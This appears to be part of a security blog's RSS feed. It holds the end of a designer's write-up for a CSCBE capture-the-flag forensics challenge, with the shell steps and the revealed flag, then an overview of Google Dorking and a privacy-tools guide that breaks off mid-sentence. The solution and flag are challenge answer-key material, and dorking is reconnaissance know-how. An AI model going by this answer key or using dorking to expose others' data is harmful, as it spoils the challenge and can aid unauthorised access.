+<li>Use the strings command to extract readable text from the PDF.</li>
+<li>Filter out lines containing &ldquo;http&rdquo; using grep.</li>
+<li>Decode the obfuscated URLs by replacing encoded characters using sed.</li>
+<li>Extract the actual URLs with another grep command.</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">    <span class="c1"># Identify all links hidden in the pdf</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    strings Jeroen_Stew.pdf <span class="p">|</span> grep <span class="s2">&#34;http&#34;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\057/\//g&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\072/:/g&#39;</span><span class="p">|</span> sed <span class="s1">&#39;s/\\056/./g&#39;</span> <span class="p">|</span> grep -Eo <span class="s2">&#34;(http|https)://[a-zA-Z0-9./?=_%:-]*&#34;</span> &gt; links.txt</span></span></code></pre></div></li>
+<li>
+<p>Downloading the Files:</p>
+<ul>
+<li>Objective: Retrieve all files hosted on the web server via the extracted links.</li>
+<li>Method: Use wget to download all URLs listed in links.txt.</li>
+</ul>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">    <span class="c1"># wget all the links</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    wget -i links.txt</span></span></code></pre></div></li>
+<li>
+<p>Identifying the Flag:</p>
+<ul>
+<li>Objective: Search through the downloaded files to locate the one containing the flag.</li>
+<li>Method: Utilize grep to recursively search for the pattern CSC{ within the files.</li>
+</ul>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">    <span class="c1"># Identify the flag from the files</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    grep -r <span class="s2">&#34;CSC{&#34;</span> ./</span></span></code></pre></div></li>
+</ol>
+<h3 id="complete-proof-of-concept-poc-script">Complete Proof-of-Concept (PoC) Script</h3>
+<p>For convenience, here&rsquo;s the full PoC script that consolidates all the steps:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">    <span class="c1"># Identify all links hidden in the pdf</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    strings Jeroen_Stew.pdf <span class="p">|</span> grep <span class="s2">&#34;http&#34;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\057/\//g&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\072/:/g&#39;</span><span class="p">|</span> sed <span class="s1">&#39;s/\\056/./g&#39;</span> <span class="p">|</span> grep -Eo <span class="s2">&#34;(http|https)://[a-zA-Z0-9./?=_%:-]*&#34;</span> &gt; links.txt
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="c1"># wget all the links</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    wget -i links.txt
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="c1"># Identify the flag from the files</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">    grep -r <span class="s2">&#34;CSC{&#34;</span> ./</span></span></code></pre></div><blockquote>
+<p><strong>Usage:</strong>  Run the Script: Execute the above commands in the terminal within the directory containing Jeroen_Stew.pdf.
+<strong>Result:</strong> The flag CSC{th3_53cr3t_15_5ug3rcan3} will be revealed upon successful execution.</p>
+</blockquote>
+<h2 id="the-joy-of-contributing">The Joy of Contributing</h2>
+<p>Designing &ldquo;Jeroen&rsquo;s Secret Bamboo Stew&rdquo; was a deeply rewarding experience. As a challenge contributor, I aimed to create a puzzle that was not only technically engaging but also enjoyable for participants. Here’s what made this endeavor particularly fulfilling:</p>
+<ol>
+<li>Blending Creativity with Technical Expertise
+Crafting a challenge that intertwines forensics, programming, and steganography required a balanced mix of creativity and technical skill. Ensuring that each component seamlessly connected to the next was both challenging and satisfying.</li>
+<li>Watching Participants Engage and Solve
+Observing participants as they dissected the challenge and eventually unraveled the solution was immensely gratifying. Their &ldquo;aha!&rdquo; moments and the strategies they employed provided valuable insights and reinforced the importance of well-designed challenges.</li>
+<li>Enhancing My Own Skills
+Developing this challenge pushed me to deepen my understanding of PDF manipulation, JavaScript obfuscation, and web server configurations. It was a hands-on learning experience that enhanced also my capabilities in cybersecurity.</li>
+<li>Contributing to the CSCBE Community
+Being part of CSCBE as a contributor allowed me to give back to a community that continually inspires and nurtures cybersecurity talent. It&rsquo;s a privilege to help shape the experiences of aspiring professionals and to foster a spirit of curiosity and resilience.</li>
+</ol>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>Contributing to the CSCBE allowed me to hone my skills in crafting puzzles and thinking like both an attacker and a defender. Seeing participants enjoy and tackle my challenge made all the effort worthwhile.</p>
+<p>If you ever get the chance to contribute to a cybersecurity competition, I highly recommend it! Not only is it a chance to give back to the community, but it’s also an incredibly fun and fulfilling experience. Until next year’s CSCBE, keep hacking and stay curious!</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Google Dorking</title>
+      <link>https://blog.tokumei.lu/blog/google-dorking/</link>
+      <pubDate>Sat, 17 Feb 2024 00:00:00 +0000</pubDate><author>webapp@tokumei.lu (Tokumei)</author>
+      <guid>https://blog.tokumei.lu/blog/google-dorking/</guid>
+      <description>Exploring the World of Google Dorking In the vast expanse of the internet, search engines serve as our trusty guides, helping us navigate through the endless sea of information. However, beneath the surface lies a hidden treasure trove of data waiting to be unearthed. Welcome to the intriguing realm of Google Dorking—an art form that goes beyond traditional search queries to uncover valuable insights and vulnerabilities.&#xA;What is Google Dorking? Google Dorking, also known as Google hacking, refers to the practice of using advanced search operators to refine search queries and yield specific, targeted results.</description>
+      <content:encoded><![CDATA[<h1 id="exploring-the-world-of-google-dorking">Exploring the World of Google Dorking</h1>
+<p>In the vast expanse of the internet, search engines serve as our trusty guides, helping us navigate through the endless sea of information. However, beneath the surface lies a hidden treasure trove of data waiting to be unearthed. Welcome to the intriguing realm of Google Dorking—an art form that goes beyond traditional search queries to uncover valuable insights and vulnerabilities.</p>
+<h2 id="what-is-google-dorking">What is Google Dorking?</h2>
+<p>Google Dorking, also known as Google hacking, refers to the practice of using advanced search operators to refine search queries and yield specific, targeted results. While Google&rsquo;s standard search interface is user-friendly and intuitive, it only scratches the surface of the immense index of web pages and databases that Google has crawled.</p>
+<p>By leveraging specialized operators and syntax, savvy researchers and ethical hackers can delve deep into the web&rsquo;s underbelly, uncovering sensitive information, misconfigured servers, and other digital artifacts that are not readily accessible through conventional means.</p>
+<h2 id="the-power-of-advanced-operators">The Power of Advanced Operators</h2>
+<p>At the heart of Google Dorking are advanced operators—specialized keywords and symbols that modify search queries to narrow down results. Some commonly used operators include:</p>
+<ul>
+<li><strong>site:</strong>: Limits the search to a specific domain or website.</li>
+<li><strong>intitle:</strong>: Searches for pages with specific words in the title.</li>
+<li><strong>filetype:</strong>: Filters results based on file type, such as PDF, DOC, or XLS.</li>
+<li><strong>inurl:</strong>: Searches for URLs containing a specific keyword.</li>
+<li><strong>cache:</strong>: Retrieves the cached version of a webpage as indexed by Google.</li>
+</ul>
+<p>By combining and customizing these operators, researchers can uncover a wealth of information, from confidential documents and login credentials to exposed APIs and vulnerable web servers.</p>
+<h2 id="ethical-implications-and-best-practices">Ethical Implications and Best Practices</h2>
+<p>While Google Dorking can be a powerful tool for research and reconnaissance, it is essential to approach it with caution and ethical responsibility. The indiscriminate use of advanced operators to access sensitive information without authorization can potentially violate privacy laws and terms of service agreements.</p>
+<p>Ethical hackers and security professionals must adhere to strict ethical guidelines and legal boundaries when conducting Google Dorking operations. This includes obtaining proper authorization before probing systems, respecting the privacy of individuals and organizations, and responsibly disclosing any vulnerabilities discovered to the relevant parties.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In an age where information is currency, Google Dorking offers a glimpse into the hidden corners of the internet, where valuable insights and vulnerabilities await discovery. Whether used for legitimate research, security testing, or reconnaissance, the power of Google Dorking lies in its ability to uncover the truth that lies beneath the surface of the web.</p>
+<p>As we continue to navigate the digital landscape, let us remember the importance of ethical conduct and responsible stewardship in the pursuit of knowledge and security.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Protecting Your Digital Privacy: Essential Tools and Tips</title>
+      <link>https://blog.tokumei.lu/blog/privacy-tools/</link>
+      <pubDate>Sat, 17 Feb 2024 00:00:00 +0000</pubDate><author>webapp@tokumei.lu (Tokumei)</author>
+      <guid>https://blog.tokumei.lu/blog/privacy-tools/</guid>
+      <description>In today&amp;rsquo;s interconnected world, maintaining your digital privacy is more important than ever. From pervasive online tracking to data breaches and surveillance, there are numerous threats to your privacy lurking on the internet. Fortunately, PrivacyTools.io offers a comprehensive collection of privacy-respecting tools and services to help you safeguard your personal information and reclaim control over your digital identity. In this blog post, we&amp;rsquo;ll explore some of the essential tools recommended by PrivacyTools.</description>
+      <content:encoded><![CDATA[<p>In today&rsquo;s interconnected world, maintaining your digital privacy is more important than ever. From pervasive online tracking to data breaches and surveillance, there are numerous threats to your privacy lurking on the internet. Fortunately, <a href="https://www.privacytools.io">PrivacyTools.io</a> offers a comprehensive collection of privacy-respecting tools and services to help you safeguard your personal information and reclaim control over your digital identity. In this blog post, we&rsquo;ll explore some of the essential tools recommended by PrivacyTools.io and why they are crucial for protecting your digital privacy.</p>
+<h2 id="web-browsers">Web Browsers</h2>
+<p>Web browsers are your gateway to the internet, but many popular browsers come with built-in tracking mechanisms and data collection features that compromise your privacy. Privacy-focused browsers like <a href="https://www.mozilla.org/firefox/">Firefox</a> and <a href="https://brave.com/">Brave</a> prioritize user privacy by blocking trackers, enforcing HTTPS connections, and offering built-in ad and tracker blockers. By using a privacy-focused browser, you can browse the web with confidence, knowing that your online activities are shielded from prying eyes.</p>
+<h3 id="firefox">Firefox</h3>
+<p><a href="https://www.mozilla.org/firefox/">Firefox</a> is an open-source browser developed by Mozilla, known for its strong stance on privacy and security. It offers features like Enhanced Tracking Protection, which blocks third-party trackers, and DNS over HTTPS, which encrypts your DNS queries. Firefox also supports a wide range of privacy-focused extensions to enhance your browsing experience.</p>
+<h3 id="brave">Brave</h3>
+<p><a href="https://brave.com/">Brave</a> is a privacy-focused browser that blocks ads and trackers by default, providing a faster and more private browsing experience. It also offers a built-in feature called Brave Shields, which blocks invasive trackers, scripts, and ads while maintaining website functionality. Additionally, Brave supports Brave Rewards, allowing users to earn cryptocurrency rewards for viewing privacy-respecting ads.</p>
+<h2 id="email-providers">Email Providers</h2>
+<p>Email is a primary communication tool for many people, but traditional email providers often mine your emails for data and serve you targeted ads based on your correspondence. Privacy-focused email providers like <a href="https://proton.me/mail">ProtonMail</a> and <a href="https://tutanota.com/">Tutanota</a> offer end-to-end encryption, ensuring that only you and the intended recipient can read your emails. By using a privacy-focused email provider, you can communicate securely and keep your sensitive information private.</p>
+<h3 id="protonmail">ProtonMail</h3>
+<p><a href="https://proton.me/mail">ProtonMail</a> is an encrypted email service based in Switzerland, offering end-to-end encryption for emails and attachments. It also provides features like self-destructing emails, two-factor authentication, and zero-access encryption, ensuring that even ProtonMail cannot access your emails.</p>
+<h3 id="tutanota">Tutanota</h3>
+<p><a href="https://tutanota.com/">Tutanota</a> is another secure email provider that offers end-to-end encryption and zero-access encryption for emails and attachments. It also provides features like calendar integration, contacts encryption, and a built-in encrypted calendar to protect your privacy while managing your schedule and contacts.</p>
+<h2 id="virtual-private-networks-vpns">Virtual Private Networks (VPNs)</h2>
+<p>A Virtual Private Network (VPN) encrypts your internet connection and routes your traffic through a secure server, protecting your online activities from prying eyes. VPNs like <a href="https://mullvad.net/">Mullvad</a> and <a href="https://protonvpn.com/">ProtonVPN</a> offer strong encryption, a strict no-logs policy, and a wide range of server locations to maximize your privacy protection. By using a VPN, you can browse the web anonymously and access geo-restricted content without sacrificing your privacy.</p>
+<h3 id="mullvad">Mullvad</h3>
+<p><a href="https://mullvad.net/">Mullvad</a> is a privacy-focused VPN provider based in Sweden, known for its strong commitment to user privacy and security. It offers features like WireGuard protocol support, which provides faster and more secure connections, and anonymous account creation, allowing users to sign up without providing any personal information.</p>
+<h3 id="protonvpn">ProtonVPN</h3>
+<p><a href="https://protonvpn.com/">ProtonVPN</a> is a VPN service developed by the creators of ProtonMail, offering strong encryption and a strict no-logs policy to protect user privacy. It also provides features like Secure Core, which routes your traffic through multiple servers in privacy-friendly countries for added security, and a built-in kill switch to prevent data leaks in case of VPN connection drops.</p>
+<h2 id="password-managers">Password Managers</h2>
+<p>Using strong, unique passwords for each of your online accounts is essential for protecting your digital security. However, remembering complex passwords for multiple accounts can be challenging. Password managers like <a href="https://bitwarden.com/">Bitwarden</a> and <a href="https://keepassxc.org/">KeePassXC</a> generate and store strong passwords for you, ensuring that your accounts remain secure against hacking attempts and data breaches. By using a password manager, you can strengthen your digital security and protect your sensitive information.</p>
+<h3 id="bitwarden">Bitwarden</h3>
+<p><a href="https://bitwarden.com/">Bitwarden</a> is an open-source password manager that offers features like end-to-end encryption, cross-platform compatibility, and secure password sharing. It also provides browser extensions and mobile apps for easy access to your passwords across all your devices. Bitwarden&rsquo;s self-hosting option allows more advanced users to host their password vault on their own servers for complete control over their data.</p>
+<h3 id="keepassxc">KeePassXC</h3>
+<p><a href="https://keepassxc.org/">KeePassXC</a> is a free and open-source password manager that stores your passwords in an encrypted database, protected by a master password or key file. It offers features like strong encryption, secure password generation, and multi-platform support. KeePassXC&rsquo;s</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
